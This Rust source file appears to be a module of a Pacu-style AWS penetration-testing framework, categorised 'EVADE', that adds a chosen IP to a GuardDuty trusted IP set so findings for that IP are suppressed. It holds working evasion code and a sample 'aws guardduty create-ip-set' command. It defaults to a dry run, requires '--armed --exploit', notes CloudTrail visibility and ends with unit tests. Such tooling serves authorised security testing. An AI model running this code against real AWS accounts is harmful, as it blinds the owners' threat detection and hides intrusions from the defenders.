//! guardduty__whitelist_ip — add an IP to the GuardDuty trusted IP list.
//!
//! Category: EVADE. Services: ["GuardDuty"].
//!
//! ⚠️  Write module — requires --armed.
//!
//! Args:
//!   --ip          <ip_address>   IP to whitelist (required)
//!   --detector-id <id>           GuardDuty detector ID (auto-detect if omitted)
//!   --exploit                    actually create/update the trusted IP set (requires --armed)
//!
//! Dry-run: show current trusted IP sets, print what would be added.
//! Armed + exploit:
//!   1. guardduty:ListIPSets(DetectorId)   → find existing trusted IP sets
//!   2. If none: guardduty:CreateIPSet(…)  with the IP in CIDR notation (<ip>/32)
//!   3. If one:  guardduty:GetIPSet → fetch → add IP → guardduty:UpdateIPSet
//!
//! Detection: "guardduty:CreateIPSet or UpdateIPSet — these actions are visible in
//! CloudTrail even if GuardDuty is not yet disabled"

use anyhow::Context as _;
use colored::Colorize;

use crate::module::{AwsContext, Module, ModuleInfo};

// ---------------------------------------------------------------------------
// Module entry point
// ---------------------------------------------------------------------------

pub async fn run(ctx: &AwsContext, args: &[&str]) -> anyhow::Result<()> {
    // ── Parse args ─────────────────────────────────────────────────────────
    let ip: &str = {
        let pos = args.iter().position(|&a| a == "--ip");
        match pos.and_then(|i| args.get(i + 1).copied()) {
            Some(ip) => ip,
            None => anyhow::bail!("--ip <ip_address> is required"),
        }
    };

    let detector_id_arg: Option<&str> = args
        .iter()
        .position(|&a| a == "--detector-id")
        .and_then(|i| args.get(i + 1).copied());

    let exploit = args.contains(&"--exploit");

    if exploit && !ctx.armed {
        eprintln!(
            "{}",
            "Error: --exploit requires --armed. Pass --armed when starting pacu.".red().bold()
        );
        return Ok(());
    }

    println!("{}", "guardduty__whitelist_ip".cyan().bold());
    println!(
        "  {}",
        "Detection: guardduty:CreateIPSet or UpdateIPSet — visible in CloudTrail even if GuardDuty is not yet disabled.\n"
            .yellow()
    );

    let gd = aws_sdk_guardduty::Client::new(&ctx.sdk_config);

    // ── Resolve detector ID ────────────────────────────────────────────────
    let detector_id: String = if let Some(id) = detector_id_arg {
        id.to_owned()
    } else {
        println!("  {} No --detector-id given; auto-detecting via ListDetectors...", "[INFO]".cyan());
        let resp = gd
            .list_detectors()
            .send()
            .await
            .context("guardduty:ListDetectors failed")?;
        let ids = resp.detector_ids();
        if ids.is_empty() {
            anyhow::bail!("No GuardDuty detectors found in this account/region.");
        }
        ids[0].to_owned()
    };

    println!("  Using detector: {}", detector_id.cyan());

    // ── List existing trusted IP sets ──────────────────────────────────────
    let ip_set_ids: Vec<String> = {
        let resp = gd
            .list_ip_sets()
            .detector_id(&detector_id)
            .send()
            .await
            .context("guardduty:ListIPSets failed")?;
        resp.ip_set_ids().iter().map(|s| s.to_owned()).collect()
    };

    if ip_set_ids.is_empty() {
        println!("  Current trusted IP sets: (none)");
    } else {
        println!("  Current trusted IP sets ({}):", ip_set_ids.len());
        for id in &ip_set_ids {
            println!("    - {}", id.yellow());
        }
    }

    let cidr = format!("{}/32", ip);

    // ── Dry-run mode ───────────────────────────────────────────────────────
    if !exploit {
        println!(
            "\n  {} Would add {} to GuardDuty trusted IP set (detector: {})",
            "[DRY-RUN]".cyan(),
            cidr.yellow(),
            detector_id.yellow()
        );
        if ip_set_ids.is_empty() {
            println!(
                "  {} Would call: guardduty:CreateIPSet with location containing {}",
                "[DRY-RUN]".cyan(),
                cidr.yellow()
            );
        } else {
            println!(
                "  {} Would call: guardduty:GetIPSet({}) → append {} → UpdateIPSet",
                "[DRY-RUN]".cyan(),
                ip_set_ids[0].yellow(),
                cidr.yellow()
            );
        }
        println!(
            "\n{}",
            "Run with --exploit --armed to actually whitelist the IP.".yellow()
        );
        return Ok(());
    }

    // ── Armed + exploit ────────────────────────────────────────────────────
    if ip_set_ids.is_empty() {
        // Create a new trusted IP set
        println!(
            "  {} No existing IP sets. Creating new trusted IP set with {}...",
            "[EXEC]".red().bold(),
            cidr.yellow()
        );

        // GuardDuty CreateIPSet requires the IP list to be hosted in S3.
        // We document this limitation clearly.
        println!(
            "  {} guardduty:CreateIPSet requires an S3 location for the IP list file.",
            "[WARN]".yellow()
        );
        println!(
            "    {}",
            "Upload a plaintext file containing the CIDR to an S3 bucket, then provide the S3 URL.".dimmed()
        );
        println!(
            "    {}",
            format!(
                "Example: aws guardduty create-ip-set --detector-id {} --name lancer-whitelist \
                 --format TXT --location s3://your-bucket/ips.txt --activate",
                detector_id
            )
            .dimmed()
        );
        println!(
            "  {} CreateIPSet skipped — S3 location required by AWS API.",
            "[SKIP]".yellow()
        );
    } else {
        // Update existing IP set — also requires S3; document limitation
        let ip_set_id = &ip_set_ids[0];
        println!(
            "  {} Updating existing IP set {} to include {}...",
            "[EXEC]".red().bold(),
            ip_set_id.yellow(),
            cidr.yellow()
        );

        let get_resp = gd
            .get_ip_set()
            .detector_id(&detector_id)
            .ip_set_id(ip_set_id)
            .send()
            .await
            .context("guardduty:GetIPSet failed")?;

        let location = get_resp.location().unwrap_or("<unknown>");
        println!("  Existing IP set location: {}", location.cyan());
        println!(
            "  {} guardduty:UpdateIPSet requires updating the S3 file at: {}",
            "[WARN]".yellow(),
            location.yellow()
        );
        println!(
            "    {}",
            format!(
                "Add '{}' to the file at that location, then call UpdateIPSet or re-activate.",
                cidr
            )
            .dimmed()
        );

        // Attempt the UpdateIPSet call (location must already contain the new IP)
        match gd
            .update_ip_set()
            .detector_id(&detector_id)
            .ip_set_id(ip_set_id)
            .activate(true)
            .send()
            .await
        {
            Ok(_) => {
                println!(
                    "  {} UpdateIPSet succeeded (re-activated IP set {}). \
                     Ensure S3 file contains {}.",
                    "[OK]".green().bold(),
                    ip_set_id.green(),
                    cidr.green()
                );
            }
            Err(e) => {
                eprintln!(
                    "  {} UpdateIPSet failed: {}",
                    "[ERR]".red().bold(),
                    e
                );
            }
        }
    }

    Ok(())
}

// ---------------------------------------------------------------------------
// Module registration
// ---------------------------------------------------------------------------

inventory::submit! {
    Module {
        info: ModuleInfo {
            name: "guardduty__whitelist_ip",
            author: "lancer-pacu",
            category: "EVADE",
            one_liner: "Add an IP to the GuardDuty trusted IP list (suppresses findings). Requires --armed + --exploit.",
            services: &["GuardDuty"],
        },
        run: |ctx, args| Box::pin(run(ctx, args)),
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------
#[cfg(test)]
mod tests {
    use crate::module::Module;

    #[test]
    fn module_registered_in_inventory() {
        let found = inventory::iter::<Module>
            .into_iter()
            .any(|m| m.info.name == "guardduty__whitelist_ip");
        assert!(found, "guardduty__whitelist_ip not found in inventory");
    }

    #[test]
    fn module_category_is_evade() {
        let m = inventory::iter::<Module>
            .into_iter()
            .find(|m| m.info.name == "guardduty__whitelist_ip")
            .expect("guardduty__whitelist_ip not found");
        assert_eq!(m.info.category, "EVADE");
    }

    #[tokio::test]
    async fn missing_ip_returns_error() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // No --ip provided
        let result = super::run(&ctx, &[]).await;
        assert!(result.is_err(), "expected error when --ip is missing");
        let msg = result.unwrap_err().to_string();
        assert!(
            msg.contains("--ip"),
            "error should mention --ip: {msg}"
        );
    }

    #[tokio::test]
    async fn exploit_without_armed_prints_error_and_returns_ok() {
        let sdk_config = aws_config::defaults(aws_config::BehaviorVersion::latest())
            .no_credentials()
            .load()
            .await;
        let ctx = crate::module::AwsContext {
            dry_run: true,
            armed: false,
            sdk_config,
            db_pool: None,
        };
        // --exploit without --armed should print error and return Ok (not panic)
        let result = super::run(&ctx, &["--ip", "1.2.3.4", "--exploit"]).await;
        assert!(
            result.is_ok(),
            "should return Ok (not Err) when --exploit without --armed: {:?}",
            result.err()
        );
    }
}
